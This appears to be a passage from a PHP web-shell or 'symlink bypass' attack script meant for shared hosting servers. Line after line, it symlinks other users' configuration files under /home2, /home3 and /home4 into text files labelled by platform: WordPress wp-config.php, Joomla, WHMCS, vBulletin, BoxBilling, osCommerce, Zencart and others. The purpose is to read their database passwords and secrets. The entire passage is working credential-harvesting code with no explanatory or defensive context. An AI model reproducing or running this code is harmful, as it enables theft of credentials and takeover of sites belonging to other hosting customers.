@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
